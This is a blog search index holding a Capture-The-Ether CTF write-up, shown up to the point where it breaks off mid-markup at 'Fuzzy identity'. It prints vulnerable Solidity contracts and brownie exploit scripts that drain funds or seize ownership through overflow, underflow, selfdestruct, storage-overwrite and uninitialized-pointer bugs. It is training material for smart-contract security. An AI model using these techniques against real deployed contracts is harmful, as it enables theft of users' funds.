<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Capture-The-Ether CTF - Math, Accounts &amp; Miscellaneous</title>
      <link href="/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/"/>
      <url>/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/</url>
      
        <content type="html"><![CDATA[<hr><h3 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h3><h2 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">TokenSaleChallenge</span> &#123;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf;</span><br><span class="line">    uint256 constant <span class="variable constant_">PRICE_PER_TOKEN</span> = <span class="number">1</span> ether;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">TokenSaleChallenge</span>(<span class="params">address _player</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> &lt; <span class="number">1</span> ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">buy</span>(<span class="params">uint256 numTokens</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == numTokens * <span class="variable constant_">PRICE_PER_TOKEN</span>);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] += numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sell</span>(<span class="params">uint256 numTokens</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.<span class="property">sender</span>] &gt;= numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] -= numTokens;</span><br><span class="line">        msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(numTokens * <span class="variable constant_">PRICE_PER_TOKEN</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to make the balance of this contract to be less than 1 ether. this contract provides us with <code>buy()</code> and <code>sell()</code> functions where in <code>buy()</code> function contract checks if the amount of tokens we are buying * 10^18 is equal to <code>msg.value</code>, since this contract is not using <code>safemath</code> library we can overflow the integers. we can pass a value to <code>numbTokens</code> such that when it is multiplied with <code>PRICE_PER_TOKEN</code> the product will be grater than <code>2^256</code>, this makes the integer overflow and getting a mod of <code>2^256</code> done and the value will be the remainder which is less than an ether which we give as the <code>msg.value</code> to get the check pass and get tokens, now we got a lot of tokens with very less price, now we can sell them and drain the contractâ€™s balance to complete this challenge.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> TokenSaleChallenge, accounts, Wei</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = TokenSaleChallenge.deploy(</span><br><span class="line">        player, &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    tokens = inverse(Wei(<span class="string">&#x27;1 ether&#x27;</span>), <span class="number">2</span>**<span class="number">256</span>)</span><br><span class="line">    contract.buy(tokens, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: (</span><br><span class="line">        tokens*Wei(<span class="string">&#x27;1 ether&#x27;</span>)) % <span class="number">2</span>**<span class="number">256</span>&#125;)</span><br><span class="line">    contract.sell(<span class="number">1</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">TokenWhaleChallenge</span> &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balanceOf;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name = <span class="string">&quot;Simple ERC20 Token&quot;</span>;</span><br><span class="line">    string public symbol = <span class="string">&quot;SET&quot;</span>;</span><br><span class="line">    uint8 public decimals = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">TokenWhaleChallenge</span>(<span class="params">address _player</span>) public &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        totalSupply = <span class="number">1000</span>;</span><br><span class="line">        balanceOf[player] = <span class="number">1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> balanceOf[player] &gt;= <span class="number">1000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">Transfer</span>(address indexed <span class="keyword">from</span>, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_transfer</span>(<span class="params">address to, uint256 value</span>) internal &#123;</span><br><span class="line">        balanceOf[msg.<span class="property">sender</span>] -= value;</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">Transfer</span>(msg.<span class="property">sender</span>, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 value</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[msg.<span class="property">sender</span>] &gt;= value);</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        <span class="title function_">_transfer</span>(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">Approval</span>(</span><br><span class="line">        address indexed owner,</span><br><span class="line">        address indexed spender,</span><br><span class="line">        uint256 value</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint256 value</span>) public &#123;</span><br><span class="line">        allowance[msg.<span class="property">sender</span>][spender] = value;</span><br><span class="line">        emit <span class="title class_">Approval</span>(msg.<span class="property">sender</span>, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">        address to,</span></span><br><span class="line"><span class="params">        uint256 value</span></span><br><span class="line"><span class="params">    </span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[<span class="keyword">from</span>] &gt;= value);</span><br><span class="line">        <span class="built_in">require</span>(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        <span class="built_in">require</span>(allowance[<span class="keyword">from</span>][msg.<span class="property">sender</span>] &gt;= value);</span><br><span class="line"></span><br><span class="line">        allowance[<span class="keyword">from</span>][msg.<span class="property">sender</span>] -= value;</span><br><span class="line">        <span class="title function_">_transfer</span>(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To compete this challenge we need make the balance of player to be grater than <code>1000000</code>. similar to the previous challenge this contract is not using <code>safemath</code> library, but in this case instead of overflowing integer we are able to make an underflow of the balance of the player. if we observe the <code>transferFrom()</code> function it has checks whether the from address has sufficient balance and the allowance of the from to <code>msg.sender</code> but the transfer is done from <code>msg.sender</code> to the given to_address since it is calling the <code>_transfer()</code> function and that function is transfering funds from <code>msg.sender</code> so in this case the contract doesnâ€™t checks for the balance of the <code>msg.sender</code> before deducting it so if we send more funds than the balance from our players account using <code>transferFrom()</code> function, then we can make the integer which holds the playerâ€™s balance to get underflowed and make the balance grater than <code>1000000</code> to complete this challenge.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> TokenWhaleChallenge, accounts, ZERO_ADDRESS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line">    helper = accounts[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    contract = TokenWhaleChallenge.deploy(player,</span><br><span class="line">                                          &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    contract.transfer(helper, <span class="number">505</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    contract.approve(player, <span class="number">500</span>, &#123;<span class="string">&#x27;from&#x27;</span>: helper&#125;)</span><br><span class="line">    contract.transferFrom(helper, ZERO_ADDRESS, <span class="number">500</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">RetirementFundChallenge</span> &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner = msg.<span class="property">sender</span>;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration = now + <span class="number">10</span> years;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">RetirementFundChallenge</span>(<span class="params">address player</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line"></span><br><span class="line">        beneficiary = player;</span><br><span class="line">        startBalance = msg.<span class="property">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (now &lt; expiration) &#123;</span><br><span class="line">            <span class="comment">// early withdrawal incurs a 10% penalty</span></span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>((<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> * <span class="number">9</span>) / <span class="number">10</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">collectPenalty</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == beneficiary);</span><br><span class="line"></span><br><span class="line">        uint256 withdrawn = startBalance - <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// an early withdrawal occurred</span></span><br><span class="line">        <span class="built_in">require</span>(withdrawn &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// penalty is what&#x27;s left</span></span><br><span class="line">        msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to steal the funds of this conract. this contract allows us to collect the penalty using <code>collectPenalty()</code> function if the owner withdraws his funds before the expiration time. but if we observer the <code>collectPenalty()</code> function the contract is checking if the difference between startBalance which is the amount deposited in the start and the current balance is <code>0</code> if not the remaining balance is transfered to our address. so if send some extra ether to this contract we steal all the balance left inside this contract but this contract doesnâ€™t have a <code>fallback()</code> or <code>recieve()</code> function to accept ether. but we can force this contract to recieve ether by destroying an other contract using <code>selfdestruct</code> method and to send itâ€™s remaining balance to this contract.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Rf</span>_Exploit &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address payable _address</span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="title function_">selfdestruct</span>(_address);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> RetirementFundChallenge, Rf_Exploit, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = RetirementFundChallenge.deploy(</span><br><span class="line">        player, &#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line">    Rf_Exploit.deploy(</span><br><span class="line">        contract.address, &#123;<span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    contract.collectPenalty(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">MappingChallenge</span> &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set</span>(<span class="params">uint256 key, uint256 value</span>) public &#123;</span><br><span class="line">        <span class="comment">// Expand dynamic array as needed</span></span><br><span class="line">        <span class="keyword">if</span> (map.<span class="property">length</span> &lt;= key) &#123;</span><br><span class="line">            map.<span class="property">length</span> = key + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params">uint256 key</span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to make the bool <code>isComplete</code> to <code>true</code>. since we can change the length of the <code>map</code> which is an <code>uint256[]</code> we can update the length to <code>2^256</code> so we can get access to all the slots inside this contracts storage. now we can calculate the <code>index</code> number to which it points to the <code>slot 0</code> where the <code>isComplete</code> is in, and overwrite it with <code>0x01</code> hance the value of <code>isComplete</code> is <code>true</code>.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> MappingChallenge, accounts, web3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = MappingChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    contract.<span class="built_in">set</span>(<span class="number">2</span>**<span class="number">256</span> - <span class="built_in">int</span>(web3.soliditySha3(</span><br><span class="line">        abi_types=[<span class="string">&#x27;uint256&#x27;</span>], values=[<span class="number">1</span>]).<span class="built_in">hex</span>()[<span class="number">2</span>:], <span class="number">16</span>), <span class="number">0x01</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DonationChallenge</span> &#123;</span><br><span class="line">    struct <span class="title class_">Donation</span> &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Donation</span>[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">DonationChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        </span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">donate</span>(<span class="params">uint256 etherAmount</span>) public payable &#123;</span><br><span class="line">        <span class="comment">// amount is in ether, but msg.value is in wei</span></span><br><span class="line">        uint256 scale = <span class="number">10</span>**<span class="number">18</span> * <span class="number">1</span> ether;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == etherAmount / scale);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Donation</span> donation;</span><br><span class="line">        donation.<span class="property">timestamp</span> = now;</span><br><span class="line">        donation.<span class="property">etherAmount</span> = etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.<span class="title function_">push</span>(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner);</span><br><span class="line">        </span><br><span class="line">        msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to steal the funds of this contract. we can steal the funds only if we are owner, since the function <code>donate()</code> creates an <code>uninitialized storage pointer</code> which will be pointing to <code>slot 0</code> by default. we the <code>donation.timestanp</code> overwrites the length of the <code>donations</code> array, and the <code>donation.etherAmount</code> will overwrite the owner variable. now thereâ€™s an other bug in this contract in the calculation of the scale which makes us easiar to give the value of the our address to the function to become owner since the scale is <code>10^36</code> we can send the value of our address divided by <code>10^36</code> and send the answee amount of ether and pass our address to the <code>donate()</code> function to become <code>owner</code> and we can steal the funds by calling <code>withdraw()</code> function.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> DonationChallenge, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = DonationChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    contract.donate(<span class="built_in">int</span>(player.address, <span class="number">16</span>), &#123;</span><br><span class="line">                    <span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="built_in">int</span>(player.address, <span class="number">16</span>) // <span class="number">10</span>**<span class="number">36</span>&#125;)</span><br><span class="line">    <span class="keyword">assert</span> contract.owner() == player</span><br><span class="line">    contract.withdraw(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h2><hr><h3 id="Accounts"><a href="#Accounts" class="headerlink" title="Accounts"></a>Accounts</h3><h2 id="Fuzzy-identity"><a href="#Fuzzy-identity" class="headerlink" title="Fuzzy identity"></a>Fuzzy identity</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 